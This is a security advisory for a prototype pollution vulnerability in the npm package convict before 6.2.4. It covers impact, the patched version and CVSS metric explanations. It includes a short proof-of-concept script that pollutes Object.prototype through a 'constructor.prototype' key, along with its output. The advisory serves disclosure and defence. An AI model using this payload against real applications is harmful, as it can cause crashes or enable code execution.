# Prototype Pollution in convict

High

[clouserw](/clouserw)
published
GHSA-4jrm-c32x-w4jf
Jan 9, 2023

## Package

npm

convict
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

< 6.2.4

## Patched versions

6.2.4

## Description

### Impact

* An attacker can inject attributes that are used in other components
* An attacker can override existing attributes with ones that have incompatible type, which may lead to a crash.

The main use case of Convict is for handling server-side configurations written by the admins owning the servers, and not random users. So it's unlikely that an admin would deliberately sabotage their own server. Still a situation can happen where an admin not knowledgeable about JavaScript could be tricked by an attacker into writing the malicious JavaScript code into some config files.

### Patches

The problem is patched in `convict@6.2.4`. Users should upgrade to `convict@6.2.4`.

### Workarounds

No way for users to fix or remediate the vulnerability without upgrading

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

## Description

Convict is vulnerable to Prototype Pollution. This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.

Proof of Concept

Create the following PoC file:

* index.js

```
const convict = require("convict"); //6.2.3
let obj = {}; const config = convict(obj);
console.log({}.polluted) //undefined
config.set("constructor.prototype.polluted", "polluted1");
let a= {}
console.log(a.polluted) //polluted1

```

Run> node index.js

Output

```
undefined
polluted1

```

💻 Technical Description \*

Fix implemented by not allowing to modify object prototype.

Filter out all keywords and check for vulnerable instances like `constructor | __proto__ | prototype`
